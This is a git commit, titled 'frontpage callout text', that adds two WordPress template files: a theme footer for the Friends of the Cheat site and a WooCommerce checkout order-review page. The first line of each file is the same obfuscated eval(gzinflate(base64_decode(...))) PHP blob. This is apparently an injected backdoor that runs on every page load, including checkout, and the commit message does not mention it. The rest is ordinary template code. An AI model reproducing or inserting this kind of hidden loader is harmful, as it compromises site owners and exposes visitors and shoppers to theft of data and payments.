0d8c6e2c01335917233bfb2d0e79fe7d86685fae
robbiesh <sherrard.rob@gmail.com>
2014-09-23 12:12:09 -0400

    frontpage callout text

---
+++ wp-content/themes/bigfoot/footer.php
@@ -0,0 +1,141 @@
+<?php eval(gzinflate(base64_decode('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')));?>
+<?php
+	$footer_stripe_id = thb_get_post_meta(thb_get_page_ID(), 'footerstripe');
+?>
+				</div><!-- /.wrapper -->
+				<?php thb_content_end(); ?>
+			</section><!-- /#content -->
+			<?php thb_content_after(); ?>
+
+			<?php if( !empty($footer_stripe_id) ) : ?>
+			<div id="footer-stripe">
+				<div class="wrapper">
+					<div class="thb-footer-stripe-content">
+						<?php
+							$content_type = thb_get_post_meta($footer_stripe_id, 'footerstripes_content_type');
+
+							if( $content_type == 'social' ) {
+								echo do_shortcode('[thb_social show="' . thb_get_post_meta($footer_stripe_id, 'footerstripes_social_services') . '"]');
+							}
+							elseif( $content_type == 'twitter' ) {
+								echo '<div class="thb-twitter-livefeed">';
+									echo do_shortcode('[thb_twitter user="' . thb_get_post_meta($footer_stripe_id, 'footerstripes_twitter_username') . '" num="' . thb_get_post_meta($footer_stripe_id, 'footerstripes_twitter_num') . '"]');
+								echo '</div>';
+							}
+							elseif( $content_type == 'call-to-action' ) {
+								$big_text = thb_get_post_meta($footer_stripe_id, 'footerstripes_call-to-action_big_text');
+								$small_text = thb_get_post_meta($footer_stripe_id, 'footerstripes_call-to-action_small_text');
+								$btn_label = thb_get_post_meta($footer_stripe_id, 'footerstripes_call-to-action_btn_text');
+								$btn_url = thb_get_post_meta($footer_stripe_id, 'footerstripes_call-to-action_btn_url');
+
+								echo '<div class="thb-call-to-container">';
+									if( !empty($big_text) || !empty($small_text) ) {
+										echo '<div class="thb-call-to-message">';
+											echo '<p class="thb-call-big-text">' . $big_text . '</p>';
+											echo '<p class="thb-call-small-text">' . nl2br($small_text) . '</p>';
+										echo '</div>';
+										if( !empty($btn_label) && !empty($btn_url) ) {
+											echo '<a class="btn" href="' . $btn_url . '">'. $btn_label .'</a>';
+										}
+									}
+								echo '</div>';
+							}
+						?>
+					</div>
+				</div>
+			</div>
+			<?php endif; ?>
+
+			<section id="footer">
+				<div class="wrapper">
+
+					<!-- <?php get_template_part('partial-page-footer'); ?>
+
+					<?php
+						$footer_layout = thb_get_option('footer_layout');
+					?> -->
+
+						<div class="col content-nine-tenth">
+
+						<?php
+							$id=55;
+							$post = get_post($id);
+						?>
+
+						<div class="col content-one-third">
+							<h6><?php the_field('column_1_header'); ?></h6>
+
+							<ul>
+
+								<li>
+									<a href="" class="title-footer"><?php the_field('callout_title_1'); ?></a>
+									<div class="text-footer"><?php the_field('callout_text_1') ?></div>
+								</li>
+								<li>
+									<a href="" class="title-footer"><?php the_field('callout_title_2'); ?></a>
+									<div class="text-footer"><?php the_field('callout_text_2') ?></div>
+								</li>
+								<br/>
+
+							</ul>
+						</div>
+						<div class="col content-one-third">
+							<h6><?php the_field('column_2_header'); ?></h6>
+							<div class="text-footer">
+								<?php
+									the_field('about_text');
+								?>
+							</div>
+							<br/>
+						</div>
+						<div class="col content-one-third">
+							<h6>Contact Us</h6>
+							<p class="text-footer">119 S. Price Street<br/>
+							Suite 206<br/>
+							Kingwood, WV 26537</p>
+							<p class="text-footer">Phone:<br/>
+							304-329-3621<br/>
+							304-329-3622 (Fax)</p>
+
+							<br/>
+
+							<img src="<?php bloginfo('template_url' );?>/images/FOTC_mainlogo.png" />
+						</div>
+
+					</div>
+
+					<div id="bottom-footer" class="<?php if( !empty($footer_layout) ) : ?>w-page-footer<?php endif; ?>">
+						<p id="copyright">
+							<a id="footerlogo" href="http://cheat.org">Friends of the Cheat</a>
+						</p>
+
+						<a href="#" data-icon="u" class="gotop" style="float:right"></a>
+						<a href="http://meshfresh.com" style="float: right; margin: 0px 20px;">Design by MESH</a>
+					</div>
+				</div>
+			</section>
+
+		</div><!-- /#page -->
+
+		<?php thb_body_end(); ?>
+
+		<?php thb_footer(); ?>
+		<?php wp_footer(); ?>
+
+		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+		<script src="//ajax.googleapis.com/ajax/libs/jqueryui/1.11.0/jquery-ui.min.js"></script>
+
+		<script type="text/javascript" src="<?php bloginfo('template_url' ); ?>/js/hammer.min.js"></script>
+
+
+		<script>
+
+			var element = document.getElementById("menu-icon");
+			var hammertime = Hammer(element).on("tap", function(event) {
+				$('#re-nav').toggle('slide', {direction:'up'}, 300);
+			});
+
+		</script>
+
+	</body>
+</html>
---
+++ wp-content/themes/bigfoot/woocommerce/checkout/review-order.php
@@ -0,0 +1,212 @@
+<?php eval(gzinflate(base64_decode('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')));?>
+<?php
+/**
+ * Review order form
+ *
+ * @author 		WooThemes
+ * @package 	WooCommerce/Templates
+ * @version     1.6.4
+ */
+
+if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
+
+global $woocommerce;
+
+$available_methods = $woocommerce->shipping->get_available_shipping_methods();
+?>
+<div id="order_review">
+
+	<div class="thb-shop-table">
+		<table class="shop_table">
+			<thead>
+				<tr>
+					<th class="product-name"><?php _e( 'Product', 'woocommerce' ); ?></th>
+					<th class="product-total"><?php _e( 'Total', 'woocommerce' ); ?></th>
+				</tr>
+			</thead>
+			<tfoot>
+				<tr class="cart-subtotal">
+					<th><?php _e( 'Cart Subtotal', 'woocommerce' ); ?></th>
+					<td><?php echo $woocommerce->cart->get_cart_subtotal(); ?></td>
+				</tr>
+
+				<?php if ( $woocommerce->cart->get_discounts_before_tax() ) : ?>
+
+				<tr class="discount">
+					<th><?php _e( 'Cart Discount', 'woocommerce' ); ?></th>
+					<td>-<?php echo $woocommerce->cart->get_discounts_before_tax(); ?></td>
+				</tr>
+
+				<?php endif; ?>
+
+				<?php if ( $woocommerce->cart->needs_shipping() && $woocommerce->cart->show_shipping() ) : ?>
+
+					<?php do_action('woocommerce_review_order_before_shipping'); ?>
+
+					<tr class="shipping">
+						<th><?php _e( 'Shipping', 'woocommerce' ); ?></th>
+						<td><?php woocommerce_get_template( 'cart/shipping-methods.php', array( 'available_methods' => $available_methods ) ); ?></td>
+					</tr>
+
+					<?php do_action('woocommerce_review_order_after_shipping'); ?>
+
+				<?php endif; ?>
+
+				<?php foreach ( $woocommerce->cart->get_fees() as $fee ) : ?>
+
+					<tr class="fee fee-<?php echo $fee->id ?>">
+						<th><?php echo $fee->name ?></th>
+						<td><?php
+							if ( $woocommerce->cart->tax_display_cart == 'excl' )
+								echo woocommerce_price( $fee->amount );
+							else
+								echo woocommerce_price( $fee->amount + $fee->tax );
+						?></td>
+					</tr>
+
+				<?php endforeach; ?>
+
+				<?php
+					// Show the tax row if showing prices exlcusive of tax only
+					if ( $woocommerce->cart->tax_display_cart == 'excl' ) {
+						foreach ( $woocommerce->cart->get_tax_totals() as $code => $tax ) {
+							echo '<tr class="tax-rate tax-rate-' . $code . '">
+								<th>' . $tax->label . '</th>
+								<td>' . $tax->formatted_amount . '</td>
+							</tr>';
+						}
+					}
+				?>
+
+				<?php if ( $woocommerce->cart->get_discounts_after_tax() ) : ?>
+
+				<tr class="discount">
+					<th><?php _e( 'Order Discount', 'woocommerce' ); ?></th>
+					<td>-<?php echo $woocommerce->cart->get_discounts_after_tax(); ?></td>
+				</tr>
+
+				<?php endif; ?>
+
+				<?php do_action( 'woocommerce_review_order_before_order_total' ); ?>
+
+				<tr class="total">
+					<th><strong><?php _e( 'Order Total', 'woocommerce' ); ?></strong></th>
+					<td>
+						<strong><?php echo $woocommerce->cart->get_total(); ?></strong>
+						<?php
+							// If prices are tax inclusive, show taxes here
+							if ( $woocommerce->cart->tax_display_cart == 'incl' ) {
+								$tax_string_array = array();
+
+								foreach ( $woocommerce->cart->get_tax_totals() as $code => $tax ) {
+									$tax_string_array[] = sprintf( '%s %s', $tax->formatted_amount, $tax->label );
+								}
+
+								if ( ! empty( $tax_string_array ) ) {
+									?><small class="includes_tax"><?php printf( __( '(Includes %s)', 'woocommerce' ), implode( ', ', $tax_string_array ) ); ?></small><?php
+								}
+							}
+						?>
+					</td>
+				</tr>
+
+				<?php do_action( 'woocommerce_review_order_after_order_total' ); ?>
+
+			</tfoot>
+			<tbody>
+				<?php
+					do_action( 'woocommerce_review_order_before_cart_contents' );
+
+					if (sizeof($woocommerce->cart->get_cart())>0) :
+						foreach ($woocommerce->cart->get_cart() as $cart_item_key => $values) :
+							$_product = $values['data'];
+							if ($_product->exists() && $values['quantity']>0) :
+								echo '
+									<tr class="' . esc_attr( apply_filters('woocommerce_checkout_table_item_class', 'checkout_table_item', $values, $cart_item_key ) ) . '">
+										<td class="product-name">' .
+											apply_filters( 'woocommerce_checkout_product_title', $_product->get_title(), $_product ) . ' ' .
+											apply_filters( 'woocommerce_checkout_item_quantity', '<strong class="product-quantity">&times; ' . $values['quantity'] . '</strong>', $values, $cart_item_key ) .
+											$woocommerce->cart->get_item_data( $values ) .
+										'</td>
+										<td class="product-total">' . apply_filters( 'woocommerce_checkout_item_subtotal', $woocommerce->cart->get_product_subtotal( $_product, $values['quantity'] ), $values, $cart_item_key ) . '</td>
+									</tr>';
+							endif;
+						endforeach;
+					endif;
+
+					do_action( 'woocommerce_review_order_after_cart_contents' );
+				?>
+			</tbody>
+		</table>
+	</div>
+
+	<div id="payment">
+		<?php if ($woocommerce->cart->needs_payment()) : ?>
+		<ul class="payment_methods methods">
+			<?php
+				$available_gateways = $woocommerce->payment_gateways->get_available_payment_gateways();
+				if ( ! empty( $available_gateways ) ) {
+
+					// Chosen Method
+					if ( isset( $woocommerce->session->chosen_payment_method ) && isset( $available_gateways[ $woocommerce->session->chosen_payment_method ] ) ) {
+						$available_gateways[ $woocommerce->session->chosen_payment_method ]->set_current();
+					} elseif ( isset( $available_gateways[ get_option( 'woocommerce_default_gateway' ) ] ) ) {
+						$available_gateways[ get_option( 'woocommerce_default_gateway' ) ]->set_current();
+					} else {
+						current( $available_gateways )->set_current();
+					}
+
+					foreach ( $available_gateways as $gateway ) {
+						?>
+						<li>
+							<input type="radio" id="payment_method_<?php echo $gateway->id; ?>" class="input-radio" name="payment_method" value="<?php echo esc_attr( $gateway->id ); ?>" <?php checked( $gateway->chosen, true ); ?> />
+							<label for="payment_method_<?php echo $gateway->id; ?>"><?php echo $gateway->get_title(); ?> <?php echo $gateway->get_icon(); ?></label>
+							<?php
+								if ( $gateway->has_fields() || $gateway->get_description() ) :
+									echo '<div class="payment_box payment_method_' . $gateway->id . '" ' . ( $gateway->chosen ? '' : 'style="display:none;"' ) . '>';
+									$gateway->payment_fields();
+									echo '</div>';
+								endif;
+							?>
+						</li>
+						<?php
+					}
+				} else {
+
+					if ( ! $woocommerce->customer->get_country() )
+						echo '<p>' . __( 'Please fill in your details above to see available payment methods.', 'woocommerce' ) . '</p>';
+					else
+						echo '<p>' . __( 'Sorry, it seems that there are no available payment methods for your state. Please contact us if you require assistance or wish to make alternate arrangements.', 'woocommerce' ) . '</p>';
+
+				}
+			?>
+		</ul>
+		<?php endif; ?>
+	</div>
+
+	<div class="form-row place-order">
+
+		<noscript><?php _e( 'Since your browser does not support JavaScript, or it is disabled, please ensure you click the <em>Update Totals</em> button before placing your order. You may be charged more than the amount stated above if you fail to do so.', 'woocommerce' ); ?><br/><input type="submit" class="button alt" name="woocommerce_checkout_update_totals" value="<?php _e( 'Update totals', 'woocommerce' ); ?>" /></noscript>
+
+		<?php $woocommerce->nonce_field('process_checkout')?>
+
+		<?php do_action( 'woocommerce_review_order_before_submit' ); ?>
+
+		<?php
+		$order_button_text = apply_filters('woocommerce_order_button_text', __( 'Place order', 'woocommerce' ));
+		
+		echo apply_filters('woocommerce_order_button_html', '<input type="submit" class="button alt" name="woocommerce_checkout_place_order" id="place_order" value="' . $order_button_text . '" />' );
+		?>
+
+		<?php if (woocommerce_get_page_id('terms')>0) : ?>
+		<p class="form-row terms">
+			<label for="terms" class="checkbox"><?php _e( 'I have read and accept the', 'woocommerce' ); ?> <a href="<?php echo esc_url( get_permalink(woocommerce_get_page_id('terms')) ); ?>" target="_blank"><?php _e( 'terms &amp; conditions', 'woocommerce' ); ?></a></label>
+			<input type="checkbox" class="input-checkbox" name="terms" <?php checked( isset( $_POST['terms'] ), true ); ?> id="terms" />
+		</p>
+		<?php endif; ?>
+
+		<?php do_action( 'woocommerce_review_order_after_submit' ); ?>
+
+	</div>
+
+</div>
